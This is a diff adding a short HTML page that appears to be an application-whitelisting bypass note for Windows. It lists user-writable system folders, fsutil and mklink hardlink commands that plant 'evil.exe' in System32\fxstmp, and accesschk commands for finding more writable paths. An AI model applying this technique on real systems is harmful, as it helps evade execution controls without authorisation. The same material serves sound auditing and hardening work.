@@ -1,0 +1,45 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Bypass Using File Locations</title>
+</head><body>The following folders are by default writable by normal users (depends on Windows version - This is from W10 1803)<br/>
+<br/>
+C:\Windows\Tasks <br/>
+C:\Windows\Temp <br/>
+C:\windows\tracing<br/>
+C:\Windows\Registration\CRMLog<br/>
+C:\Windows\System32\FxsTmp<br/>
+C:\Windows\System32\com\dmp<br/>
+C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys<br/>
+C:\Windows\System32\spool\PRINTERS<br/>
+C:\Windows\System32\spool\SERVERS<br/>
+C:\Windows\System32\spool\drivers\color<br/>
+C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter<br/>
+C:\Windows\SysWOW64\FxsTmp<br/>
+C:\Windows\SysWOW64\com\dmp<br/>
+C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter<br/>
+C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System<br/>
+<br/>
+If you can place a file or folder into the path you become the owner of that object and you can change the ACL either in GUI or using ICALS. That includes adding Execute rights and more. If deny execute is inherit you can either disable inheritance or you can use hardlink to a binary file in another folder using one of these commands:<br/>
+<br/>
+fsutil create hardlink c:\windows\system32\fxstmp\evil.exe c:\myfolder\plantedfile.exe <br/>
+<br/>
+mklink /h c:\windows\system32\fxstmp\evil.exe c:\myfolder\plantedfile.exe <br/>
+<br/>
+You can check the for additional paths by running accesschk from sysinternals and supplying these commands:<br/>
+<br/>
+accesschk -w -s -q -u Users "C:\Program Files" &gt;&gt; programfiles.txt<br/>
+accesschk -w -s -q -u Everyone "C:\Program Files" &gt;&gt; programfiles.txt<br/>
+accesschk -w -s -q -u "Authenticated Users" "C:\Program Files" &gt;&gt; programfiles.txt<br/>
+accesschk -w -s -q -u Interactive "C:\Program Files" &gt;&gt; programfiles.txt<br/>
+<br/>
+accesschk -w -s -q -u Users "C:\Program Files (x86)" &gt;&gt; programfilesx86.txt<br/>
+accesschk -w -s -q -u Everyone "C:\Program Files (x86)" &gt;&gt; programfilesx86.txt<br/>
+accesschk -w -s -q -u "Authenticated Users" "C:\Program Files (x86)" &gt;&gt; programfilesx86.txt<br/>
+accesschk -w -s -q -u Interactive "C:\Program Files (x86)" &gt;&gt; programfilesx86.txt<br/>
+<br/>
+accesschk -w -s -q -u Users "C:\Windows" &gt;&gt; windows.txt<br/>
+accesschk -w -s -q -u Everyone "C:\Windows" &gt;&gt; windows.txt<br/>
+accesschk -w -s -q -u "Authenticated Users" "C:\Windows" &gt;&gt; windows.txt<br/>
+accesschk -w -s -q -u Interactive "C:\Windows" &gt;&gt; windows.txt</body></html>
